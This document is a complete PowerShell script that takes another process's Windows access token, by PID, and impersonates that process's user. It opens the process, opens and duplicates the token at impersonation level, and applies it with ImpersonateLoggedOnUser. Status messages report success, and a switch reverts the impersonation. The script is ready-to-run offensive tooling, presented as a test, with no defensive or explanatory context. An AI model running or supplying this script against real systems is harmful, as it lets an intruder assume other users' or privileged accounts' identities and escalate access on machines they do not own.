param(
    [int]$TargetPID,
    [switch]$Revert
)


Add-Type @"
using System;
using System.Runtime.InteropServices;

public class ImpersonationHelper
{
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(int access, bool inherit, int pid);

    [DllImport("kernel32.dll")]
    public static extern uint GetLastError();

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool OpenProcessToken(IntPtr processHandle, UInt32 desiredAccess, out IntPtr tokenHandle);

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool DuplicateTokenEx(
        IntPtr existingToken,
        UInt32 desiredAccess,
        IntPtr tokenAttributes,
        int impersonationLevel,
        int tokenType,
        out IntPtr newToken
    );

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr token);

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool RevertToSelf();
}
"@

function Show-LastError {
    $err = [ImpersonationHelper]::GetLastError()
    Write-Host "[!] WinAPI Error: $err" -ForegroundColor Red
}

if ($Revert) {
    Write-Host "[*] Reverting impersonation..." -ForegroundColor Yellow
    [ImpersonationHelper]::RevertToSelf() | Out-Null

    Write-Host "[+] Reverted"

    Write-Host "[*] Current identity:"
    [System.Security.Principal.WindowsIdentity]::GetCurrent().Name

    return
}


if (-not $TargetPID) {
    Write-Host "Usage:"
    Write-Host ".\impersonation_test.ps1 -TargetPID <pid>"
    Write-Host ".\impersonation_test.ps1 -Revert"
    return
}

Write-Host "`n[*] Target PID: $TargetPID" -ForegroundColor Cyan


$PROCESS_QUERY_INFORMATION = 0x0400

$hProcess = [ImpersonationHelper]::OpenProcess($PROCESS_QUERY_INFORMATION, $false, $TargetPID)

if ($hProcess -eq [IntPtr]::Zero) {
    Write-Host "[!] OpenProcess FAILED"
    Show-LastError
    return
}

Write-Host "[+] Process handle: $hProcess"


$TOKEN_DUPLICATE = 0x0002
$TOKEN_QUERY = 0x0008

$hToken = [IntPtr]::Zero

$ok = [ImpersonationHelper]::OpenProcessToken(
    $hProcess,
    $TOKEN_DUPLICATE -bor $TOKEN_QUERY,
    [ref]$hToken
)

if (-not $ok) {
    Write-Host "[!] OpenProcessToken FAILED"
    Show-LastError
    return
}

Write-Host "[+] Token handle: $hToken"

$SecurityImpersonation = 2
$TokenImpersonation = 2

$hDupToken = [IntPtr]::Zero

$ok = [ImpersonationHelper]::DuplicateTokenEx(
    $hToken,
    0xF01FF,
    [IntPtr]::Zero,
    $SecurityImpersonation,
    $TokenImpersonation,
    [ref]$hDupToken
)

if (-not $ok) {
    Write-Host "[!] DuplicateTokenEx FAILED"
    Show-LastError
    return
}

Write-Host "[+] Duplicated impersonation token: $hDupToken"

Write-Host "`n[*] Applying impersonation..." -ForegroundColor Yellow

$ok = [ImpersonationHelper]::ImpersonateLoggedOnUser($hDupToken)

if (-not $ok) {
    Write-Host "[!] Impersonation FAILED"
    Show-LastError
    return
}

Write-Host "[+] Impersonation SUCCESS" -ForegroundColor Green


Write-Host "`Information" -ForegroundColor Cyan

$wi = [System.Security.Principal.WindowsIdentity]::GetCurrent()

Write-Host "[*] Identity: $($wi.Name)"
Write-Host "[*] ImpersonationLevel: $($wi.ImpersonationLevel)"
Write-Host "[*] Authenticated: $($wi.IsAuthenticated)"


Write-Host "`n[*] Impersonation active. Use -Revert to go back." -ForegroundColor Yellow